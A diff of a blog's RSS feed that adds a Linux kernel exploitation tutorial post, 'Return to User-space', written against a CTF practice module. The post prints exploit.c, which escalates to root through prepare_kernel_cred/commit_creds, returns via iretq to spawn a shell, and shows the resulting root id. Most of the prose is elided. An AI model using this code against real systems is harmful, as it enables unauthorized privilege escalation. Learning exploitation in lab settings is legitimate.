@@ -1,41 +1,211 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Linux Kernel :: 0x00 :: Kernel Module Interaction
-Linux Kernel :: 0x02 :: Bypassing SMEP with CR4 Overwrite
-Linux Kernel :: 0x03 :: Bypassing SMAP with Signal Handlers
-Linux Kernel :: 0x04 :: Bypassing KPTI
-Linux Kernel :: 0x05 :: Stack Pivot in the Kernel
-Linux Kernel :: 0x06 :: Modprobe Path Overwrite
-Linux Kernel :: 0x07 :: Bypassing KASLR
-Linux Kernel :: 0x08 :: Return to Direct-mapped Memory
-Table of Contents User-space vs.</description><content>&lt;p>&lt;a href="https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction">Linux Kernel :: 0x00 :: Kernel Module Interaction&lt;/a>&lt;br>
-Linux Kernel :: 0x02 :: Bypassing SMEP with CR4 Overwrite&lt;br>
-Linux Kernel :: 0x03 :: Bypassing SMAP with Signal Handlers&lt;br>
-Linux Kernel :: 0x04 :: Bypassing KPTI&lt;br>
-Linux Kernel :: 0x05 :: Stack Pivot in the Kernel&lt;br>
-Linux Kernel :: 0x06 :: Modprobe Path Overwrite&lt;br>
-Linux Kernel :: 0x07 :: Bypassing KASLR&lt;br>
-Linux Kernel :: 0x08 :: Return to Direct-mapped Memory&lt;/p>
-&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Anvbis</title><link>https://anvbis.github.io/</link><description>Recent content on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 25 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Putting it All Together User-space vs. Kernel-space &amp;hellip;
+Return to User-space Overview &amp;hellip;
+Saving the Initial State &amp;hellip;
+unsigned long save_ss, save_sp, save_rf, save_cs; void save_user_space() { /* save user-space */ __asm__( &amp;#34;.intel_syntax noprefix;&amp;#34; &amp;#34;mov save_ss, ss;&amp;#34; &amp;#34;mov save_sp, rsp;&amp;#34; &amp;#34;pushf;&amp;#34; &amp;#34;pop save_rf;&amp;#34; &amp;#34;mov save_cs, cs;&amp;#34; &amp;#34;.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
 &lt;ol>
-&lt;li>&lt;a href="#user--space-vs--kernel--space">User-space vs. Kernel-space&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#saving-the-initial-state">Saving the Initial State&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#restoring-the-initial-state">Restoring the Initial State&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
+&lt;li>&lt;a href="#putting-it-all-together">Putting it All Together&lt;/a>&lt;/li>
 &lt;/ol>
 &lt;h2 id="user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p></content></item><item><title>Linux Kernel :: 0x00 :: Kernel Module Interaction</title><link>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</link><pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</guid><description>Linux Kernel :: 0x01 :: Return to User-space
-Linux Kernel :: 0x02 :: Bypassing SMEP with CR4 Overwrite
-Linux Kernel :: 0x03 :: Bypassing SMAP with Signal Handlers
-Linux Kernel :: 0x04 :: Bypassing KPTI
-Linux Kernel :: 0x05 :: Stack Pivot in the Kernel
-Linux Kernel :: 0x06 :: Modprobe Path Overwrite
-Linux Kernel :: 0x07 :: Bypassing KASLR
-Linux Kernel :: 0x08 :: Return to Direct-mapped Memory
-Table of Contents Environment Setup Debugging in the Kernel Kernel Module Overview Compiling Kernel Modules Inserting Kernel Modules Interacting with File-based Operations Interacting with IOCTL Environment Setup The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel.</description><content>&lt;p>&lt;a href="https://anvbis.github.io/posts/linux-kernel-1-ret2usr">Linux Kernel :: 0x01 :: Return to User-space&lt;/a>&lt;br>
-Linux Kernel :: 0x02 :: Bypassing SMEP with CR4 Overwrite&lt;br>
-Linux Kernel :: 0x03 :: Bypassing SMAP with Signal Handlers&lt;br>
-Linux Kernel :: 0x04 :: Bypassing KPTI&lt;br>
-Linux Kernel :: 0x05 :: Stack Pivot in the Kernel&lt;br>
-Linux Kernel :: 0x06 :: Modprobe Path Overwrite&lt;br>
-Linux Kernel :: 0x07 :: Bypassing KASLR&lt;br>
-Linux Kernel :: 0x08 :: Return to Direct-mapped Memory&lt;/p>
-&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;h2 id="return-to-user-space-overview">Return to User-space Overview&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;h2 id="saving-the-initial-state">Saving the Initial State&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
+&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
+{
+&lt;span style="color:#75715e">/* save user-space */&lt;/span>
+__asm__(
+&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
+);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;pre>&lt;code>void load_user_space(unsigned long target)
+{
+/* return to user-space */
+__asm__(
+&amp;quot;.intel_syntax noprefix;&amp;quot;
+&amp;quot;swapgs;&amp;quot;
+&amp;quot;mov r15, save_ss;&amp;quot;
+&amp;quot;push r15;&amp;quot;
+&amp;quot;mov r15, save_sp;&amp;quot;
+&amp;quot;push r15;&amp;quot;
+&amp;quot;mov r15, save_rf;&amp;quot;
+&amp;quot;push r15;&amp;quot;
+&amp;quot;mov r15, save_cs;&amp;quot;
+&amp;quot;push r15;&amp;quot;
+&amp;quot;mov r15, %[rip];&amp;quot;
+&amp;quot;push r15;&amp;quot;
+&amp;quot;iretq;&amp;quot;
+&amp;quot;.att_syntax;&amp;quot;
+: [rip] &amp;quot;=&amp;amp;r&amp;quot; (target)
+);
+}
+&lt;/code>&lt;/pre>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
+&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
+&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
+&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
+&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
+&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
+{
+&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
+__asm__(
+&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
+&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
+);
+&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
+load_user_space(&lt;span style="color:#75715e">/* target return address */&lt;/span>);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
+{
+&lt;span style="color:#75715e">// ...
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
+{
+&lt;span style="color:#75715e">// ...
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="putting-it-all-together">Putting it All Together&lt;/h2>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/1/exploit.c">exploit.c&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
+{
+system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
+{
+save_user_space();
+&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
+assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
+&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
+&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
+printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
+overflow_buffer(fd, canary);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="collapsable-code">
+&lt;input id="6" type="checkbox" checked />
+&lt;label for="6">
+&lt;span class="collapsable-code__language">c&lt;/span>
+&lt;span class="collapsable-code__title">exploit.c&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-c" >&lt;code>
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;assert.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+unsigned long save_ss, save_sp, save_rf, save_cs;
+void shell()
+{
+system(&amp;#34;/bin/sh&amp;#34;);
+}
+void save_user_space()
+{
+/* save user-space */
+__asm__(
+&amp;#34;.intel_syntax noprefix;&amp;#34;
+&amp;#34;mov save_ss, ss;&amp;#34;
+&amp;#34;mov save_sp, rsp;&amp;#34;
+&amp;#34;pushf;&amp;#34;
+&amp;#34;pop save_rf;&amp;#34;
+&amp;#34;mov save_cs, cs;&amp;#34;
+&amp;#34;.att_syntax;&amp;#34;
+);
+}
+void load_user_space(unsigned long target)
+{
+/* return to user-space */
+__asm__(
+&amp;#34;.intel_syntax noprefix;&amp;#34;
+&amp;#34;swapgs;&amp;#34;
+&amp;#34;mov r15, save_ss;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, save_sp;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, save_rf;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, save_cs;&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;mov r15, %[rip];&amp;#34;
+&amp;#34;push r15;&amp;#34;
+&amp;#34;iretq;&amp;#34;
+&amp;#34;.att_syntax;&amp;#34;
+: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
+);
+}
+void escalate_privileges()
+{
+/* escalate privileges */
+__asm__(
+&amp;#34;.intel_syntax noprefix;&amp;#34;
+&amp;#34;xor rdi, rdi;&amp;#34;
+&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
+&amp;#34;call rbx;&amp;#34;
+&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
+&amp;#34;mov rdi, rax;&amp;#34;
+&amp;#34;call rbx;&amp;#34;
+&amp;#34;.att_syntax;&amp;#34;
+);
+/* return to user-space */
+load_user_space((unsigned long)shell);
+}
+unsigned long leak_canary(int fd)
+{
+// ...
+}
+void overflow_buffer(int fd, unsigned long canary)
+{
+// ...
+}
+int main(int argc, char **argv)
+{
+save_user_space();
+int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
+assert(fd &amp;gt; 0);
+/* leak stack canary */
+unsigned long canary = leak_canary(fd);
+printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
+overflow_buffer(fd, canary);
+return 0;
+}
+&lt;/code>&lt;/pre>
+&lt;/div>
+&lt;p>&amp;hellip;&lt;/p>
+&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
+&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # insmod challenge.ko
+/ # su ctf
+/ $ /home/ctf/exploit
+...
+/ # id
+/ # uid=0(root) gid=0
+&lt;/code>&lt;/pre></content></item><item><title>Linux Kernel :: 0x00 :: Kernel Module Interaction</title><link>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</link><pubDate>Wed, 19 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-0-kernel-module-interaction/</guid><description>Table of Contents Environment Setup Debugging in the Kernel Kernel Module Overview Compiling Kernel Modules Inserting Kernel Modules Interacting with File-based Operations Interacting with IOCTL Environment Setup The easiest kernel exploitation environment to set up for beginners (in my opinion) is pwnkernel. It will allow us to do several things that are central to Linux kernel research:
+Downloading and building specific Kernel versions. Streamlining the kernel module build process.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
 &lt;ol>
 &lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#debugging-in-the-kernel">Debugging in the Kernel&lt;/a>&lt;/li>
